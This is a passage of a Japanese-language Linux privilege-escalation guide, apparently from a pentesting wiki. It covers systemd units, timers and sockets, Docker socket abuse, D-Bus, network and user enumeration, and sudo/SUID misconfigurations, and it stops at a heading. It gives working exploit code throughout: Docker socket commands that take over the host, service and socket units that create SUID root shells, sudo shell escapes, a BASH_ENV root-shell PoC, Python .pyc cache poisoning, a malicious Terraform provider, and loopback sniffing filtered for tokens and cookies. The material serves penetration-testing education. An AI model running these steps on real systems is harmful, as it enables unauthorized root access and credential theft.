たとえば、**`ExecStart=/tmp/script.sh`** を使って、.service ファイル内に backdoor を作成します。

### 書き込み可能なサービスバイナリ

サービスによって実行されるバイナリへの**書き込み権限**がある場合、そのバイナリを backdoor に置き換えれば、サービスが再実行されたときに backdoor を実行できることを覚えておいてください。

### systemd PATH - 相対パス

**systemd** が使用する PATH は、次のコマンドで確認できます。

```bash
systemctl show-environment
```

パス内のいずれかのフォルダーに**書き込み**できる場合、**権限昇格**できる可能性があります。サービス設定ファイルで使用されている**相対パス**を探す必要があります:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

次に、書き込み可能な systemd PATH フォルダー内に、相対パスのバイナリと**同じ名前の実行可能ファイル**を作成します。サービスに脆弱なアクション（**Start**、**Stop**、**Reload**）の実行を要求すると、**バックドアが実行されます**（通常、権限のないユーザーはサービスを開始・停止できませんが、`sudo -l` を使えるか確認してください）。

**サービスについて詳しくは、`man systemd.service` を参照してください。**

## **タイマー**

**タイマー**は、`**.timer**` で終わる名前の systemd ユニットファイルで、`**.service**` ファイルやイベントを制御します。**タイマー**は cron の代替として使用できます。カレンダー時刻イベントと単調時刻イベントが組み込みでサポートされており、非同期に実行できます。

以下のコマンドですべてのタイマーを列挙できます：

```bash
systemctl list-timers --all
```

### 書き込み可能なタイマー

タイマーを変更できる場合、systemd.unit のユニット（`.service` や `.target` など）を実行させることができます。

```bash
Unit=backdoor.service
```

ドキュメントでは、Unitについて次のように説明されています。

> このタイマーの期限が切れたときに有効化するUnit。引数には、サフィックスが「.timer」ではないUnit名を指定します。指定されていない場合、この値はタイマーUnitと同じ名前（サフィックスを除く）のserviceがデフォルトになります。（上記を参照。）有効化されるUnit名とタイマーUnit名は、サフィックスを除いて同じ名前にすることが推奨されています。

したがって、この権限を悪用するには、次のものが必要です。

- **書き込み可能なバイナリを実行している**systemd unit（`.service`など）を見つける
- **相対パスを実行している**systemd unitを見つけ、**systemd PATH**に対する**書き込み権限**を持つ（その実行ファイルになりすますため）

`man systemd.timer`でタイマーについて詳しく学べます。

### **タイマーの有効化**

タイマーを有効化するには、root権限で次のコマンドを実行する必要があります。

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

`/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` にシンボリックリンクを作成すると、**timer** が**有効化**されます。

## ソケット

Unix Domain Sockets (UDS) は、クライアントサーバーモデルにおいて、同一または異なるマシン上の**プロセス間通信**を可能にします。コンピューター間の通信には標準の Unix ディスクリプタファイルを使用し、`.socket` ファイルを通じて設定します。<sup>[[14]](#references)</sup>

ソケットは `.socket` ファイルを使って設定できます。

**`man systemd.socket` でソケットの詳細を確認してください。** このファイルでは、次のような興味深いパラメータを設定できます。

- `ListenStream`、`ListenDatagram`、`ListenSequentialPacket`、`ListenFIFO`、`ListenSpecial`、`ListenNetlink`、`ListenMessageQueue`、`ListenUSBFunction`: これらのオプションはそれぞれ異なりますが、ソケットが**どこで待ち受けるか**（AF_UNIX ソケットファイルのパス、待ち受ける IPv4/6 アドレスやポート番号など）を指定するものです。
- `Accept`: 真偽値を指定します。**true** の場合、**着信接続ごとにサービスインスタンスが起動**し、そのインスタンスには接続ソケットのみが渡されます。**false** の場合、待ち受け中のソケット自体がすべて**起動したサービスユニットに渡され**、すべての接続に対してサービスユニットが1つだけ起動します。データグラムソケットと FIFO では、サービスユニット1つが常にすべての着信トラフィックを処理するため、この値は無視されます。**デフォルトは false** です。パフォーマンス上の理由から、新しいデーモンは `Accept=no` に適した方法でのみ実装することが推奨されます。
- `ExecStartPre`、`ExecStartPost`: 1つ以上のコマンドラインを指定します。待ち受け用の**ソケット**または FIFO の作成とバインドの**前**または**後**に、それぞれ実行されます。コマンドラインの最初のトークンは絶対ファイル名で、その後にプロセスの引数を指定します。
- `ExecStopPre`、`ExecStopPost`: 待ち受け用の**ソケット**または FIFO のクローズと削除の**前**または**後**に、それぞれ実行される追加の**コマンド**です。
- `Service`: **着信トラフィック**に応じて**有効化する**サービスユニット名を指定します。この設定は `Accept=no` のソケットでのみ使用できます。デフォルトでは、ソケットと同じ名前（サフィックスのみ置き換えたもの）のサービスが指定されます。ほとんどの場合、このオプションを使う必要はありません。

### 書き込み可能な .socket ファイル

**書き込み可能な** `.socket` ファイルを見つけた場合、`[Socket]` セクションの先頭に `ExecStartPre=/home/kali/sys/backdoor` のような記述を**追加**できます。これにより、ソケットが作成される前に backdoor が実行されます。そのため、**マシンが再起動されるまで待つ必要があるでしょう。**\
_この backdoor が実行されるには、システムがそのソケットファイルの設定を使用している必要があります。_

### ソケットの有効化 + 書き込み可能なユニットパス（サービスの新規作成）

影響の大きい別の設定ミスは次のとおりです。

- `Accept=no` と `Service=<name>.service` を指定したソケットユニットがある
- 参照先のサービスユニットが存在しない
- 攻撃者が `/etc/systemd/system`（または別のユニット検索パス）に書き込める

この場合、攻撃者は `<name>.service` を作成し、その後ソケットにトラフィックを送ることで、systemd に新しいサービスを root として読み込み、実行させることができます。

簡単な流れ:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### 書き込み可能なソケット

**書き込み可能なソケット**（ここで言うのは Unix ソケットであり、設定用の `.socket` ファイルではありません）を**見つけた場合**、そのソケットと通信し、脆弱性を悪用できる可能性があります。

### Unix ソケットの列挙

```bash
netstat -a -p --unix
```

### 直接接続

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**悪用の例:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTPソケット

**HTTP**リクエストを待ち受けている**ソケット**がある場合があります（`.socket`ファイルのことではなく、Unixソケットとして機能するファイルのことです）。次の方法で確認できます:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

ソケットが**HTTPリクエストに応答する**場合、ソケットと**通信**でき、場合によっては**脆弱性を悪用**できます。

### 書き込み可能な Docker Socket

Docker socket（通常は `/var/run/docker.sock` にあります）は、適切に保護すべき重要なファイルです。デフォルトでは、`root` ユーザーと `docker` グループのメンバーが書き込み可能です。このソケットへの書き込み権限があると、権限昇格につながる可能性があります。以下では、その方法と Docker CLI を利用できない場合の代替手段について説明します。

#### **Docker CLI による権限昇格**

Docker socket への書き込み権限がある場合、次のコマンドを使って権限を昇格できます。<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

これらのコマンドを使うと、ホストのファイルシステムに対する root レベルのアクセス権を持つコンテナを実行できます。

#### **Docker APIを直接使用する**

Docker CLIを利用できない場合でも、Unixソケット経由の生のHTTPを使ってDockerソケットを悪用できます。最も確実な手順は次のとおりです。

- ホストのrootをbind mountした、長時間稼働するヘルパーコンテナを作成する
- 起動する
- そのヘルパー内に`exec`インスタンスを作成する
- `exec`インスタンスを起動し、API経由で出力を読み取る

**Dockerイメージ一覧**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**ヘルパーコンテナを作成して起動する**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**execインスタンスを作成する**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**execインスタンスを起動して出力を読み取る**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

このパターンは通常、`socat` や `nc -U` を使って手動で `attach` を操作するよりも堅牢です。`/:/host` を使ってヘルパーを作成できれば、追加の `exec` インスタンスを使って `/host/root/...` などのファイルを読み取ったり、`/host/root/.ssh` に SSH keys を追加したり、ホストの起動ファイルを変更したりできます。

### その他

**`docker` グループ内にいる**ために docker socket への書き込み権限がある場合、[**権限昇格する方法はほかにもあります**](../../user-information/interesting-groups-linux-pe/index.html#docker-group)。[**docker API がポートでリッスンしている場合**、それを侵害できる可能性もあります](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)。

**コンテナから脱出したり、コンテナ runtime を悪用して権限昇格したりする方法**については、以下を確認してください。


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) の権限昇格

**`ctr`** コマンドを使用できる場合は、以下のページを読んでください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** の権限昇格

**`runc`** コマンドを使用できる場合は、以下のページを読んでください。**これを悪用して権限昇格できる可能性があります**。


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus は高度な **プロセス間通信 (IPC) システム**であり、アプリケーションが効率的に通信し、データを共有できるようにします。最新の Linux システムを念頭に設計されており、さまざまな形式のアプリケーション間通信に対応する堅牢なフレームワークを提供します。<sup>[[16]](#references)</sup>

このシステムは汎用性が高く、プロセス間のデータ交換を促進する基本的な IPC をサポートしています。これは、**拡張された UNIX domain socket** に似ています。また、イベントやシグナルのブロードキャストを支援し、システムコンポーネント間のシームレスな連携を促します。たとえば、Bluetooth daemon が着信を通知するシグナルを送ると、music player がミュートになり、ユーザー体験が向上します。さらに D-Bus は、リモートオブジェクトシステムをサポートしており、アプリケーション間のサービス要求やメソッド呼び出しを簡素化し、従来は複雑だった処理を効率化します。

D-Bus は**許可／拒否モデル**で動作し、一致するポリシールールの累積的な効果に基づいて、メッセージの権限（メソッド呼び出し、シグナルの送信など）を管理します。これらのポリシーはバスとのやり取りを指定し、権限を悪用して権限昇格を可能にする場合があります。

`/etc/dbus-1/system.d/wpa_supplicant.conf` にあるポリシーの例を示します。このポリシーでは、root ユーザーが `fi.w1.wpa_supplicant1` の所有者となり、メッセージを送信および受信するための権限を定義しています。

ユーザーまたはグループが指定されていないポリシーは、すべてのユーザーに適用されます。一方、「default」コンテキストのポリシーは、ほかの特定のポリシーの対象にならないすべてのユーザーに適用されます。

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus 通信の enumerate と exploit の方法はこちら:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **ネットワーク**

ネットワークを列挙し、マシンがどのような位置にあるかを把握するのは、いつでも興味深いものです。

### 一般的な列挙

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

`/etc/inetd.conf` の有効なエントリが GNU Inetutils の `telnetd` を root として実行している場合は、ポートが loopback にのみバインドされている場合でも、設定されたバイナリのバージョンとローカルの listener を確認してください。GNU Inetutils 1.9.3 から 2.7 には [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) があり、クライアントから送信された `USER` が `login -f` に渡されていました（CVE-2026-24061）。プロセスやバージョン文字列は兆候にすぎません。露出していると判断する前に、ベンダーのパッチ適用状況と実際のデーモンを確認してください。詳しくは [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) を参照してください。

### アウトバウンドフィルタリングのクイックトリアージ

ホストでコマンドを実行できても callback に失敗する場合は、DNS、トランスポート、プロキシ、ルートの各フィルタリングをすばやく切り分けます。

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### 開放ポート

マシンにアクセスする前に操作できなかったネットワークサービスが稼働していないか、必ず確認してください。

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

リスナーをバインド先で分類します。

- `0.0.0.0` / `[::]`: すべてのローカルインターフェースで公開されています。
- `127.0.0.1` / `::1`: ローカル限定（トンネルやポートフォワードの候補として適しています）。
- 特定の内部 IP（例: `10.x`、`172.16/12`、`192.168.x`、`fe80::`）: 通常、内部セグメントからのみ到達できます。

### ローカル限定サービスのトリアージ手順

ホストを compromise すると、`127.0.0.1` にバインドされたサービスにシェルから初めてアクセスできることがよくあります。手早く調べるには、次のローカル手順を使います。

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### ネットワークスキャナーとしてのLinPEAS（ネットワーク専用モード）

ローカルのPEチェックに加えて、linPEASは特化型ネットワークスキャナーとして実行できます。`$PATH`内で利用可能なバイナリ（通常は`fping`、`ping`、`nc`、`ncat`）を使用し、ツールをインストールしません。

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

`-t` を指定せずに `-d`、`-p`、または `-i` を指定すると、linPEAS は純粋なネットワークスキャナーとして動作します（それ以外の権限昇格チェックはスキップされます）。

### Sniffing

トラフィックを sniff できるか確認してください。可能であれば、認証情報を取得できる場合があります。

```
timeout 1 tcpdump
```

手早く実践できる確認事項:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) は post-exploitation で特に重要です。内部からのみアクセスできる多くのサービスが、そこでトークン、Cookie、認証情報を公開しているためです。

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

今キャプチャして、後で解析する：

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## ユーザー

### 一般的な列挙

自分が**誰**なのか、どのような**権限**を持っているのか、システム上にどのような**ユーザー**がいるのか、どのユーザーが**ログイン**できるのか、そして誰が**root 権限**を持っているのかを確認します。

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### Big UID

一部のLinuxバージョンには、**UID > INT_MAX** のユーザーが権限昇格できるバグがありました。詳しくは[こちら](https://gitlab.freedesktop.org/polkit/polkit/issues/74)、[こちら](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)、[こちら](https://twitter.com/paragonsec/status/1071152249529884674)をご覧ください。<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**Exploit it**: **`systemd-run -t /bin/bash`**

### Groups

root権限を得られる可能性のある**グループに所属しているか**確認してください:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### クリップボード

クリップボードに興味深い情報がないか確認してください（可能な場合）。

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### パスワードポリシー

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### 既知のパスワード

環境内の**パスワードを知っている**場合は、そのパスワードを使って**各ユーザーとしてログイン**してみてください。

### Su Brute

多くのノイズが発生しても問題なく、コンピューターに `su` と `timeout` のバイナリがある場合は、[su-bruteforce](https://github.com/carlospolop/su-bruteforce) を使ってユーザーへの brute-force を試せます。\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) も、`-a` パラメーターを指定するとユーザーへの brute-force を試みます。

## 書き込み可能な PATH の悪用

### $PATH

**$PATH 内のいずれかのフォルダーに書き込める**場合、書き込み可能なフォルダー内に、別のユーザー（理想的には root）が実行するコマンドと同じ名前のバックドアを**作成して**、権限昇格できる可能性があります。ただし、そのコマンドが $PATH 内で書き込み可能なフォルダーより前にあるフォルダーから読み込まれないことが条件です。

### SUDO と SUID

sudo を使って一部のコマンドを実行できる場合や、コマンドに suid ビットが設定されている場合があります。次の方法で確認してください：

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

一部の**予期しないコマンドでは、ファイルの読み取りや書き込み、さらにはコマンドの実行まで可能です**。<sup>[[8]](#references)</sup> 例：

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

sudoの設定によっては、ユーザーがパスワードを知らなくても、別のユーザーの権限で一部のコマンドを実行できる場合があります。

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

この例では、ユーザー `demo` は `root` として `vim` を実行できます。root ディレクトリに SSH key を追加するか、`sh` を呼び出せば、簡単に shell を取得できます。

```
sudo vim -c '!sh'
```

### sudoスクリプト内の引用符なしBash比較

Bashでは、`[[ "$protected" == $candidate ]]` の右辺はパターンとして扱われます。root権限で実行可能なsudoスクリプトが、呼び出し元の制御下にあるファイルから `candidate` の値を読み込む場合、`prefix*` のような値が保護対象の文字列の先頭に一致することがあります。成功時とエラー時で処理経路が異なると、prefix oracleが生じる可能性があります。リテラルな等価比較を意図している場合は、右辺を引用符で囲んでください（`[[ "$protected" == "$candidate" ]]`）。引用符なしの比較が悪用可能か判断する前に、実際のsudo引数、入力の出所、観測可能な分岐動作を確認してください。[GNU Bashマニュアル](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html)では、このパターンの動作が定義されています。

### sudoで実行するPrusaSlicerのプロジェクトファイル

呼び出し元がスライスする `.3mf` プロジェクトを選択できる場合、`prusaslicer` または `prusa-slicer` への制限のないroot権限実行可能なsudo許可は、確認が必要です。プロジェクトにはG-codeのエクスポート時に実行される後処理スクリプトを含められます。細工されたプロジェクトは、PrusaSlicer 2.6.1までのバージョンでコマンドを実行できる可能性があります（[CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268)）。権限境界に到達できると結論づける前に、有効なsudoルール、バイナリのバージョンとベンダーパッチ、プロジェクトの出所、該当するエクスポート処理が実行されるかを確認してください。プロジェクト引数が固定されている場合や、有効な `NOEXEC` ポリシーがある場合は、結果が変わることがあります。スライサーがインストールされていることが分かっただけでは、権限昇格経路があるとは言えません。

### SETENV

このディレクティブにより、ユーザーは何かを実行する際に **環境変数を設定** できます：

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

この例は、**HTB machine Admirer**を**基にしたもの**で、rootとしてスクリプトを実行する際に任意のPythonライブラリを読み込む**PYTHONPATH hijacking**に**脆弱**でした。

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo で実行可能な Python の import における書き込み可能な `__pycache__` / `.pyc` の poisoning

**sudo で実行可能な Python script** が、パッケージディレクトリ内に**書き込み可能な `__pycache__`** がある module を import している場合、キャッシュされた `.pyc` を置き換えて、次回の import 時に特権ユーザーとして code execution を実行できる可能性があります。<sup>[[30]](#references)</sup>

- 仕組み:
  - CPython はバイトコードキャッシュを `__pycache__/module.cpython-<ver>.pyc` に保存します。<sup>[[31]](#references)</sup>
  - インタープリターは**ヘッダー**（magic + ソースに紐づくタイムスタンプ／hash のメタデータ）を検証し、その後、ヘッダーの後に格納された marshaled code object を実行します。
  - ディレクトリが書き込み可能で、キャッシュファイルを**削除して再作成**できる場合、root 所有で書き込み不可の `.pyc` でも置き換えられます。
- よくあるパターン:
  - `sudo -l` に、root として実行できる Python script または wrapper が表示される。
  - その script は `/opt/app/`、`/usr/local/lib/...` などからローカル module を import する。
  - import される module の `__pycache__` ディレクトリが、自分のユーザーまたは全ユーザーに対して書き込み可能。

簡易な列挙:

```bash
sudo -l
find / -type d -name __pycache__ -writable 2>/dev/null
find / -type f -path '*/__pycache__/*.pyc' -ls 2>/dev/null
```

特権で実行されるスクリプトを調査できる場合は、インポートされたモジュールとそのキャッシュパスを特定します。<sup>[[32]](#references)</sup>

```bash
grep -R "^import \\|^from " /opt/target/ 2>/dev/null
python3 - <<'PY'
import importlib.util
spec = importlib.util.find_spec("target_module")
print(spec.origin)
print(spec.cached)
PY
```

悪用手順:

1. sudoで実行可能なスクリプトを一度実行し、Pythonに正規のキャッシュファイルを作成させます（まだ存在しない場合）。
2. 正規の`.pyc`から先頭16バイトを読み取り、汚染したファイルで再利用します。
3. payloadのコードオブジェクトをコンパイルし、`marshal.dumps(...)`でシリアライズします。元のキャッシュファイルを削除し、元のヘッダーと悪意のあるバイトコードを結合して再作成します。
4. sudoで実行可能なスクリプトをもう一度実行し、import時にroot権限でpayloadを実行します。

重要な注意点:

- 元のヘッダーを再利用することが重要です。Pythonはキャッシュのメタデータをソースファイルと照合しますが、バイトコード本体が実際にソースと一致するかは確認しません。
- これは、ソースファイルがroot所有で書き込み不可でも、格納先の`__pycache__`ディレクトリには書き込み可能な場合に特に有効です。
- `PYTHONDONTWRITEBYTECODE=1`と`python -B`は、Pythonによる新しい`.pyc`ファイルの書き込みを防ぎますが、すでに有効なキャッシュとして認識される、攻撃者が置き換えたファイルの読み込みまでは防ぎません。重要なのは、低権限ユーザーが、特権ユーザーによるimport時に受け入れられるキャッシュを置き換えられるかどうかです。Pythonはキャッシュされたバイトコードを読み込む前に、タイムスタンプ／サイズまたはハッシュのメタデータを確認します。[Python import reference](https://docs.python.org/3.12/reference/import.html#cached-bytecode-invalidation)および[command-line documentation](https://docs.python.org/3.12/using/cmdline.html#envvar-PYTHONDONTWRITEBYTECODE)を参照してください。

最小限のproof-of-conceptの形:

```python
import marshal, pathlib, subprocess, tempfile

pyc = pathlib.Path("/opt/app/__pycache__/target.cpython-312.pyc")
header = pyc.read_bytes()[:16]
payload = "import os; os.system('cp /bin/bash /tmp/rbash && chmod 4755 /tmp/rbash')"

with tempfile.TemporaryDirectory() as d:
    src = pathlib.Path(d) / "x.py"
    src.write_text(payload)
    code = compile(src.read_text(), str(src), "exec")
    pyc.unlink()
    pyc.write_bytes(header + marshal.dumps(code))

subprocess.run(["sudo", "/opt/app/runner.py"])
```

Hardening:

- 特権 Python import path 内のディレクトリが、低権限ユーザーによって書き込み可能でないことを確認します。`__pycache__` も対象です。
- 既存の `.pyc` ファイルを含め、キャッシュディレクトリの所有者と権限を監査します。bytecode の書き込みを無効にすると、新たなキャッシュの作成を減らせますが、置き換え可能な既存のキャッシュを無害化することはできません。
- 書き込み可能なローカル Python モジュールやキャッシュディレクトリは、root で実行される書き込み可能な shell script や共有ライブラリと同様に扱います。

### sudo env_keep によって BASH_ENV が保持される場合 → root shell

sudoers が `BASH_ENV` を保持する場合（例: `Defaults env_keep+="ENV BASH_ENV"`）、許可されたコマンドの実行時に、Bash の非対話型起動動作を利用して root として任意のコードを実行できます。<sup>[[24]](#references)</sup>

- 仕組み: 非対話型 shell では、Bash は対象の script を実行する前に `$BASH_ENV` を評価し、そのファイルを source します。多くの sudo ルールでは、script や shell wrapper の実行が許可されています。`BASH_ENV` が sudo によって保持される場合、自分のファイルが root 権限で source されます。<sup>[[23]](#references)</sup>

- 要件:
  - 実行可能な sudo ルール（非対話型で `/bin/bash` を呼び出す対象、または任意の Bash script）。
  - `BASH_ENV` が `env_keep` に含まれていること（`sudo -l` で確認）。

- PoC:

```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```

- ハードニング:
  - `BASH_ENV`（および `ENV`）を `env_keep` から削除し、`env_reset` を優先する。
  - sudo で許可するコマンドにシェルラッパーを使わず、最小限のバイナリを使う。
  - 環境変数が保持された状態で使用された場合に備え、sudo の I/O ロギングとアラートを検討する。

### sudo と保持された HOME を介した Terraform（!env_reset）

sudo で、より高い権限を持つユーザーとして Terraform の実行が許可されている場合、`!env_reset` は、そのルールで実際にどの環境変数が維持されるかを確認する手掛かりとなる。呼び出し元が書き込み可能な `.terraformrc` または `terraform.rc` を有効な CLI 設定として扱う前に、実際に有効な `HOME` または `TF_CLI_CONFIG_FILE` を確認する。`provider_installation.dev_overrides` の設定が意味を持つのは、固定された Terraform コマンドがそのプロバイダーを読み込み、かつ呼び出し元が選択されたディレクトリにその実行ファイルを配置できる場合に限られる。<sup>[[25]](#references)</sup>

- 必要なプロバイダーの配置先を、書き込み可能なディレクトリに指定し、そのプロバイダー名（例：`terraform-provider-examples`）を付けた悪意のあるプラグインを配置する。

```hcl
# ~/.terraformrc
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/dev/shm"
  }
  direct {}
}
```

```bash
cat >/dev/shm/terraform-provider-examples <<'EOF'
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chown root:root /var/tmp/rootsh
chmod 6777 /var/tmp/rootsh
EOF
chmod +x /dev/shm/terraform-provider-examples
sudo /usr/bin/terraform -chdir=/opt/examples apply
```

Terraform は Go plugin handshake に失敗しますが、終了する前に payload を root として実行し、SUID shell を残します。

### TF_VAR overrides + symlink validation bypass

